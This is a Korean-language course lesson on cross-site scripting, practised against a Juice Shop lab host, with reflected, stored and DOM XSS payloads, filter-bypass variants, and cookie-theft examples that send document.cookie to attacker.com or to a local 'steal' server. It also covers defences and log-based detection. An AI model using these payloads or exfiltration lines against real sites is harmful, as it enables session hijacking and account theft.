# Week 05: OWASP Top 10 (2) - XSS (Cross-Site Scripting)

## 학습 목표

- XSS(Cross-Site Scripting)의 개념과 위험성을 이해한다
- Reflected, Stored, DOM-based XSS의 차이를 파악한다
- JuiceShop에서 실제 XSS 공격을 수행한다
- XSS 방어 기법(출력 인코딩, CSP)을 이해한다

## 실습 환경

| 호스트 | IP | 역할 |
|--------|-----|------|
| opsclaw | 10.20.30.201 | 실습 기지 |
| web | 10.20.30.80 | JuiceShop:3000 |

---

## 1. XSS란?

XSS(Cross-Site Scripting)는 공격자가 웹 페이지에 **악성 JavaScript 코드를 삽입**하여, 다른 사용자의 브라우저에서 실행시키는 공격이다.

> **이름의 유래**: CSS(Cascading Style Sheets)와 구분하기 위해 XSS라고 부른다.

### 왜 위험한가?

JavaScript가 브라우저에서 실행되면 다음이 가능하다:
- **쿠키/세션 토큰 탈취** → 다른 사용자의 계정으로 로그인
- **키 입력 기록** → 비밀번호, 신용카드 번호 수집
- **페이지 내용 변조** → 가짜 로그인 폼 표시
- **악성 사이트로 리다이렉트**
- **CSRF 공격 수행** → 사용자 모르게 행동 실행

### SQL Injection vs XSS 비교

| 구분 | SQL Injection | XSS |
|------|---------------|-----|
| 공격 대상 | 서버(데이터베이스) | 클라이언트(브라우저) |
| 삽입 코드 | SQL 구문 | JavaScript 코드 |
| 실행 위치 | 서버의 DB 엔진 | 피해자의 브라우저 |
| 피해 | 데이터 유출/변조 | 세션 탈취, 페이지 변조 |

---

## 2. XSS 유형

### 2.1 Reflected XSS (반사형)

공격 코드가 URL 파라미터에 포함되어, 서버가 응답에 그대로 반영(reflect)한다. 피해자가 악성 링크를 클릭해야 동작한다.

**동작 흐름:**
```
1. 공격자가 악성 URL을 만듦:
   http://target.com/search?q=<script>alert('XSS')</script>

2. 피해자가 이 링크를 클릭

3. 서버가 검색 결과 페이지를 반환하면서 입력을 그대로 포함:
   "검색어: <script>alert('XSS')</script>에 대한 결과"

4. 피해자 브라우저에서 JavaScript 실행!
```

**실습:**

```bash
# JuiceShop 검색에 스크립트 삽입 시도
# URL 인코딩: < = %3C, > = %3E
curl -s "http://10.20.30.80:3000/rest/products/search?q=%3Cscript%3Ealert('XSS')%3C/script%3E" \
  | python3 -m json.tool | head -10

# 검색 결과가 HTML에 반영되는지 확인
curl -s "http://10.20.30.80:3000/#/search?q=%3Cscript%3Ealert('XSS')%3C/script%3E" | head -20
```

> **참고**: JuiceShop은 SPA(Single Page Application)이므로 검색이 클라이언트 측에서 처리된다. Reflected XSS는 주로 서버 사이드 렌더링에서 발생한다.

### 2.2 Stored XSS (저장형)

공격 코드가 서버의 데이터베이스에 **저장**되어, 해당 데이터를 보는 모든 사용자에게 영향을 준다. Reflected보다 훨씬 위험하다.

**동작 흐름:**
```
1. 공격자가 게시글/댓글에 악성 스크립트를 작성
   내용: "좋은 제품이에요! <script>document.location='http://attacker.com/steal?c='+document.cookie</script>"

2. 서버가 이 내용을 데이터베이스에 저장

3. 다른 사용자가 해당 게시글을 볼 때마다 스크립트가 실행됨!

4. 피해자의 쿠키가 공격자 서버로 전송됨
```

### 2.3 DOM-based XSS

서버를 거치지 않고, 클라이언트 측 JavaScript가 DOM(Document Object Model)을 조작할 때 발생한다.

**동작 흐름:**
```
1. 웹 페이지의 JavaScript가 URL 파라미터를 읽어서 페이지에 삽입:
   document.getElementById('output').innerHTML = location.hash.substring(1);

2. 공격자가 URL 조작:
   http://target.com/page#<img src=x onerror=alert('XSS')>

3. JavaScript가 DOM에 직접 삽입 → 브라우저에서 실행!
```

---

## 3. JuiceShop XSS 실습

### 3.1 Challenge: DOM XSS

JuiceShop의 검색 기능은 DOM-based XSS에 취약하다.

**Step 1: 정상 검색 확인**

```bash
# 검색 API 확인
curl -s "http://10.20.30.80:3000/rest/products/search?q=apple" \
  | python3 -m json.tool | head -15
```

**Step 2: XSS 페이로드 테스트**

브라우저에서 다음 URL을 열어야 한다 (curl로는 DOM XSS 확인 불가):

```
http://10.20.30.80:3000/#/search?q=<iframe src="javascript:alert('xss')">
```

curl로 JuiceShop이 입력을 어떻게 처리하는지 확인:

```bash
# 검색어에 HTML 태그가 포함된 경우 응답 확인
curl -s "http://10.20.30.80:3000/rest/products/search?q=%3Ciframe+src%3D%22javascript%3Aalert(%60xss%60)%22%3E" \
  | python3 -m json.tool | head -10
```

> **실습 안내**: DOM XSS는 브라우저에서만 동작한다. `curl`은 JavaScript를 실행하지 않으므로, 이 챌린지는 브라우저에서 직접 URL을 입력하여 테스트해야 한다.

### 3.2 Challenge: Reflected XSS

JuiceShop의 주문 추적 기능에서 Reflected XSS를 시도한다.

```bash
# 주문 추적 API 확인
curl -s "http://10.20.30.80:3000/rest/track-order/test123" \
  | python3 -m json.tool

# XSS 페이로드 삽입
curl -s "http://10.20.30.80:3000/rest/track-order/%3Ciframe%20src%3D%22javascript:alert(%60xss%60)%22%3E" \
  | python3 -m json.tool
```

> 브라우저에서 `http://10.20.30.80:3000/#/track-result?id=<iframe src="javascript:alert('xss')">` 접근

### 3.3 Challenge: Stored XSS via API

JuiceShop의 사용자 프로필이나 피드백 기능에 XSS를 저장한다.

```bash
# 먼저 로그인하여 토큰 획득
TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"student@test.com","password":"Student123!"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])" 2>/dev/null)

# 계정이 없으면 생성
if [ -z "$TOKEN" ]; then
  curl -s -X POST http://10.20.30.80:3000/api/Users/ \
    -H "Content-Type: application/json" \
    -d '{"email":"student@test.com","password":"Student123!","passwordRepeat":"Student123!","securityQuestion":{"id":1,"question":"Your eldest siblings middle name?","createdAt":"2025-01-01","updatedAt":"2025-01-01"},"securityAnswer":"test"}'
  TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
    -H "Content-Type: application/json" \
    -d '{"email":"student@test.com","password":"Student123!"}' \
    | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])")
fi

echo "Token: $TOKEN"

# 피드백에 XSS 페이로드 저장 시도
curl -s -X POST http://10.20.30.80:3000/api/Feedbacks/ \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{
    "UserId": 1,
    "captchaId": 0,
    "captcha": "-1",
    "comment": "Great shop! <script>alert(\"stored xss\")</script>",
    "rating": 5
  }' | python3 -m json.tool
```

> **참고**: captcha 값이 필요할 수 있다. 실제 공격에서는 captcha를 먼저 가져온다:

```bash
# captcha 가져오기
CAPTCHA=$(curl -s http://10.20.30.80:3000/api/Captchas/ \
  -H "Authorization: Bearer $TOKEN" \
  | python3 -c "import sys,json; d=json.load(sys.stdin); print(d['captchaId'],d['answer'])" 2>/dev/null)
echo "Captcha: $CAPTCHA"
```

---

## 4. XSS 페이로드 모음

다양한 XSS 페이로드를 알아두면 우회 기법을 이해할 수 있다.

### 4.1 기본 페이로드

```html
<!-- 기본 alert -->
<script>alert('XSS')</script>

<!-- img 태그의 onerror 이벤트 -->
<img src=x onerror=alert('XSS')>

<!-- iframe으로 JavaScript 실행 -->
<iframe src="javascript:alert('XSS')">

<!-- SVG 태그 -->
<svg onload=alert('XSS')>

<!-- body 태그 -->
<body onload=alert('XSS')>

<!-- input 태그 -->
<input onfocus=alert('XSS') autofocus>
```

### 4.2 필터 우회 기법

```html
<!-- 대소문자 혼합 -->
<ScRiPt>alert('XSS')</ScRiPt>

<!-- 인코딩 -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;('XSS')>

<!-- script 태그가 필터링될 때 -->
<scr<script>ipt>alert('XSS')</scr</script>ipt>

<!-- 백틱 사용 (따옴표 필터링 우회) -->
<img src=x onerror=alert(`XSS`)>
```

### 4.3 실습: 다양한 페이로드 테스트

```bash
# 각 페이로드가 필터링되는지 확인
PAYLOADS=(
  "<script>alert(1)</script>"
  "<img src=x onerror=alert(1)>"
  "<svg onload=alert(1)>"
  "<iframe src='javascript:alert(1)'>"
)

for payload in "${PAYLOADS[@]}"; do
  echo "Testing: $payload"
  ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))")
  RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" "http://10.20.30.80:3000/rest/products/search?q=$ENCODED")
  echo "  HTTP Status: $RESPONSE"
  echo ""
done
```

---

## 5. 쿠키 탈취 시뮬레이션

실제 공격에서 XSS의 가장 흔한 용도는 **쿠키(세션 토큰) 탈취**다.

### 5.1 공격 시나리오

```
1. 공격자가 XSS가 있는 페이지에 삽입:
   <script>
     new Image().src = "http://attacker.com/steal?cookie=" + document.cookie;
   </script>

2. 피해자가 해당 페이지를 방문

3. 피해자의 브라우저가 쿠키를 공격자 서버로 전송

4. 공격자가 탈취한 쿠키로 피해자의 세션 사용
```

### 5.2 시뮬레이션: 간이 수신 서버

```bash
# opsclaw 서버에서 간이 HTTP 서버 실행 (쿠키 수신용)
# 터미널 1: 수신 서버 시작
python3 -c "
from http.server import HTTPServer, BaseHTTPRequestHandler
class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        print(f'[STOLEN] {self.path}')
        self.send_response(200)
        self.end_headers()
    def log_message(self, *args): pass
HTTPServer(('0.0.0.0', 9999), Handler).serve_forever()
" &
STEAL_PID=$!
echo "Steal server PID: $STEAL_PID (port 9999)"

# 터미널 2: XSS 페이로드가 동작한다면 다음과 같은 요청이 수신됨
# (시뮬레이션)
curl -s "http://10.20.30.201:9999/steal?cookie=token=eyJhbGciOi..." > /dev/null 2>&1

# 서버 종료
kill $STEAL_PID 2>/dev/null
```

> **실습 목적**: 실제 XSS가 성공하면 이런 방식으로 쿠키가 유출된다는 것을 이해하기 위한 시뮬레이션이다.

### 5.3 HttpOnly 플래그의 중요성

```bash
# JuiceShop 쿠키의 HttpOnly 설정 확인
curl -v -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"student@test.com","password":"Student123!"}' 2>&1 \
  | grep -i "set-cookie"
```

**분석:**
- `HttpOnly` 플래그가 있으면: `document.cookie`로 접근 불가 → XSS로 쿠키 탈취 어려움
- `HttpOnly` 플래그가 없으면: JavaScript로 쿠키 접근 가능 → 탈취 위험

> JuiceShop의 JWT 토큰은 쿠키가 아닌 localStorage에 저장되므로, `document.cookie` 대신 `localStorage.getItem('token')`으로 탈취해야 한다.

---

## 6. XSS 방어 기법

### 6.1 출력 인코딩 (Output Encoding)

사용자 입력을 HTML에 삽입할 때 특수 문자를 인코딩한다.

| 문자 | 인코딩 |
|------|--------|
| `<` | `&lt;` |
| `>` | `&gt;` |
| `"` | `&quot;` |
| `'` | `&#x27;` |
| `&` | `&amp;` |

```html
<!-- 취약한 코드 -->
<p>검색어: 사용자입력</p>
<!-- 만약 사용자입력이 <script>alert(1)</script>이면 스크립트 실행됨! -->

<!-- 안전한 코드 -->
<p>검색어: &lt;script&gt;alert(1)&lt;/script&gt;</p>
<!-- 브라우저에 텍스트로 표시됨, 실행되지 않음 -->
```

### 6.2 Content Security Policy (CSP)

CSP는 브라우저에게 "이 페이지에서 실행할 수 있는 스크립트의 출처"를 알려주는 HTTP 헤더다.

```bash
# CSP 헤더 확인
curl -sI http://10.20.30.80:3000/ | grep -i "content-security-policy"
```

**CSP 예시:**
```
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com
```

이 설정은:
- 기본적으로 같은 출처('self')의 리소스만 허용
- 스크립트는 같은 출처와 cdn.example.com에서만 로드 가능
- 인라인 스크립트(`<script>alert(1)</script>`) 차단!

### 6.3 X-XSS-Protection 헤더

```bash
# X-XSS-Protection 헤더 확인
curl -sI http://10.20.30.80:3000/ | grep -i "x-xss"
```

> **참고**: `X-XSS-Protection`은 구형 브라우저용이며, 현재는 CSP가 더 효과적이다.

### 6.4 입력 검증과 새니타이징

```javascript
// DOMPurify 라이브러리로 HTML 정화
const clean = DOMPurify.sanitize(userInput);
document.getElementById('output').innerHTML = clean;
// <script> 태그 등 위험한 요소가 자동 제거됨
```

---

## 7. XSS와 SIEM 탐지

### 7.1 웹 서버 로그에서 XSS 흔적

```bash
# web 서버의 Apache 접근 로그 확인
sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.80 \
  "sudo cat /var/log/apache2/access.log | grep -i 'script\|alert\|onerror' | tail -5"

# JuiceShop 로그에서 XSS 시도 확인
sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.80 \
  "sudo docker logs juiceshop 2>&1 | grep -i 'script\|xss' | tail -5" 2>/dev/null
```

### 7.2 Wazuh에서 XSS 탐지

```bash
# Wazuh에서 XSS 관련 알림 확인
sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.100 \
  "sudo grep -i 'xss\|cross.site\|script' /var/ossec/logs/alerts/alerts.json 2>/dev/null | tail -3"
```

---

## 8. OpsClaw로 XSS 테스트 자동화

```bash
# XSS 테스트 프로젝트 생성
PROJECT_ID=$(curl -s -X POST http://localhost:8000/projects \
  -H "Content-Type: application/json" \
  -H "X-API-Key: opsclaw-api-key-2026" \
  -d '{"name":"week05-xss-test","request_text":"JuiceShop XSS 취약점 점검","master_mode":"external"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['id'])")

# Stage 전환
curl -s -X POST http://localhost:8000/projects/$PROJECT_ID/plan \
  -H "X-API-Key: opsclaw-api-key-2026" > /dev/null
curl -s -X POST http://localhost:8000/projects/$PROJECT_ID/execute \
  -H "X-API-Key: opsclaw-api-key-2026" > /dev/null

# XSS 페이로드 테스트 자동 실행
curl -s -X POST http://localhost:8000/projects/$PROJECT_ID/execute-plan \
  -H "Content-Type: application/json" \
  -H "X-API-Key: opsclaw-api-key-2026" \
  -d '{
    "tasks": [
      {"order":1, "instruction_prompt":"curl -sI http://10.20.30.80:3000/ | grep -iE \"content-security|x-xss|x-frame\"", "risk_level":"low"},
      {"order":2, "instruction_prompt":"curl -s http://10.20.30.80:3000/rest/products/search?q=%3Cscript%3Ealert(1)%3C/script%3E | head -5", "risk_level":"low"}
    ],
    "subagent_url": "http://localhost:8002"
  }'

# 결과 확인
curl -s -H "X-API-Key: opsclaw-api-key-2026" \
  http://localhost:8000/projects/$PROJECT_ID/evidence/summary \
  | python3 -m json.tool
```

---

## 9. 실습 체크리스트

- [ ] JuiceShop 검색에서 DOM XSS 페이로드 테스트 (`<iframe src="javascript:alert('xss')">`)
- [ ] 주문 추적에서 Reflected XSS 테스트
- [ ] 피드백 API에 Stored XSS 페이로드 제출 시도
- [ ] 쿠키 탈취 시뮬레이션 수행 (간이 서버 + curl)
- [ ] JuiceShop의 CSP 및 보안 헤더 현황 분석
- [ ] 다양한 XSS 페이로드(img, svg, iframe)로 필터 우회 시도

---

## 과제

1. JuiceShop에서 최소 1개의 XSS 챌린지를 성공시키고, 사용한 페이로드와 과정을 설명하라
2. `<script>alert(1)</script>`이 필터링될 때, 이를 우회할 수 있는 대체 페이로드 3개를 제시하라
3. CSP(Content-Security-Policy) 헤더가 설정되어 있을 때 XSS 공격이 왜 어려워지는지 설명하라
4. Stored XSS가 Reflected XSS보다 더 위험한 이유를 실제 시나리오와 함께 설명하라

---

## 핵심 요약

- **XSS**는 악성 JavaScript를 웹 페이지에 삽입하여 피해자의 브라우저에서 실행시키는 공격이다
- **Reflected XSS**: URL에 포함, 피해자가 클릭해야 동작
- **Stored XSS**: DB에 저장, 페이지를 보는 모든 사용자에게 영향 (더 위험)
- **DOM-based XSS**: 서버를 거치지 않고 클라이언트 측 JavaScript에서 발생
- **방어**: 출력 인코딩, CSP, HttpOnly 쿠키, 입력 새니타이징

> **다음 주 예고**: Week 06에서는 인증 및 접근 제어 취약점을 다룬다. JWT 공격, IDOR(Insecure Direct Object Reference), 권한 상승 공격을 JuiceShop에서 실습한다.
